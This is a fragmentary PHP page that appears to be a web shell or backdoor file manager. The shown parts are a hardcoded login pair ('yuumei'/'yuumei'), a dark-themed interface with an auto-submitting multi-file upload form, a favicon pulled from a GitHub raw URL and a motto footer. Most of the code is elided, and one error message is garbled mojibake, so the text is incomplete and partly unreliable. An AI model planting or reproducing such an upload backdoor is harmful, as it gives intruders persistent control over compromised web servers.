...
$valid_passwords = array ("yuumei" => "yuumei");
...
echo "<p color='red'>锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷</p>
...
<head>
	...
	<link rel="icon" type="image/x-icon" href="//raw.githubusercontent.com/Emilia-ZX/lein/main/favicon2.ico" sizes="32x32">
...
<body style="background-color:#000;color:#fff;font-family:serif;">
	...
	<div class="bg-black table-responsive text-light border">
		...
		<form method="post" enctype="multipart/form-data"><div class="input-group mb-3 px-3 mt-3"><div class="input-group-prepend"><div class="custom-file"><input type="file" name="f[]" class="custom-file-input" onchange="this.form.submit()" multiple><label class="custom-file-label rounded-0 bg-transparent text-light">Upload</label></div></div></div></form>
	...
	<div class="bg-black border text-center mt-2">
		...
		<small>|Faith means not wanting to know what is true.|</small>
